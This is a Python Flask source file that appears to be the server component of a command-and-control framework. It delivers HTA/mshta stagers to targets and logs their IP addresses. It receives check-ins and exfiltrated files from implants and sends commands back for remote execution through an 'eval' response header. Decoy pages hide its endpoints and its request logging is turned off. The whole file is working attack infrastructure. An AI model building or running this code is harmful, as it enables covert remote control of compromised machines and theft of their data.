import logging
import os
import urllib.parse as parse
import sys

from connect import color, connection, loader, util
from flask import Flask, make_response, render_template, request, send_file

app = Flask(__name__)

checkin_uri = f'/{util.generate_id()}'

def render(connection, file):
    mshta_code = parse.quote(render_template(f'hta/code.hta', variables = connection.stager.variables, connection_id = connection.connection_id, checkin_uri = checkin_uri, server_context = util.server_context()))
    return render_template(f'{file}', variables = connection.stager.variables, connection_id = connection.connection_id, checkin_uri = checkin_uri, server_context = util.server_context(), random_data=util.random_data, mshta_code = mshta_code, random_string = util.generate_str())

@app.route('/<format_id>', methods=['GET'])
def serve_stagers(format_id):
    remote_addr = request.remote_addr
    if format_id not in engine.STAGERS.keys():
        return render_template('random.html', random_data=util.random_data)
    stager = engine.STAGERS[format_id]
    color.information(f'{stager.format} file requested ({remote_addr})')
    connection = engine.create_connection(stager)
    connection.system_information['ip'] = remote_addr
    return render(connection, f'{connection.stager.format}/stager.{connection.stager.format}')

@app.route(f'{checkin_uri}', methods=['POST'])
def checkin():
    response = make_response(render_template('random.html', random_data=util.random_data))
    try:
        connection = engine.connections[request.headers['Connection-ID']]
    except:
        return response
    connection.system_information['ip'] = request.remote_addr
    connection.check_in()
    if request.get_data():
        data = request.get_data()
        if request.headers['mimetype'] == 'text/plain':
            color.normal('\n')
            color.information(f'Results recieved from ({request.remote_addr}):')
            color.normal(str(data,'utf-8'))
        else:
            filename = f'{util.generate_str()}.connect'
            color.normal('\n')
            color.information(f'{sys.getsizeof(data)} Bytes recieved from ({request.remote_addr}) saving to downloads/{filename}.')
            loader.download(data, f'{filename}')
    if connection.job_queue:
        job = connection.job_queue.pop(0)
        if job.type == 'function':
            color.verbose(f'Sending .. {connection.stager.format}/functions/{job.data}.{connection.stager.format}')
            response.headers['eval'] = parse.quote(render(connection, f'{connection.stager.format}/functions/{job.data}.{connection.stager.format}'))
            return response
        if job.type == 'command':
            command = job.data[0]
            if len(job.data) == 1:
                response.headers['eval'] = f'{command}()'
                color.verbose(f'{command}()')
                return response
            arguments = job.data[1:]
            if 'raw:' == arguments[0]:
                try:
                    local_file_path = arguments[1]
                    arguments.remove(local_file_path)
                    response = make_response(send_file(local_file_path))
                    arguments[0] = 'response.ResponseBody'
                except:
                    color.information('Error creating raw response.')
                    return response
            if 'stager:' == arguments[0]:
                try:
                    stager_format = arguments[1]
                    arguments[1] = f'"{stager_format}"'
                    stager = engine.retrieve_stager(stager_format)
                    _new_connection = engine.create_connection(stager)
                    response = make_response(render(_new_connection, f'{_new_connection.stager.format}/stager.{_new_connection.stager.format}'))
                    arguments[0] = 'response.ResponseBody'
                except:
                    color.information('Error creating stager response.')
                    return response
            arguments = ','.join(arguments)
            color.verbose(f'Sending .. {command}({arguments})')
            response.headers['eval'] = parse.quote(f'{command}({arguments})')
            return response
    return response

def run(ip, port):
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'
    log = logging.getLogger('werkzeug')
    log.disabled = True
    app.config['TEMPLATES_AUTO_RELOAD'] = True
    ssl_context = None
    if util.ssl:
        ssl_context = (util.ssl[0], util.ssl[1])
    try:
        app.run(host=ip, port=port, ssl_context=ssl_context)
    except:
        color.information(f'Error starting server.')
        return
    return
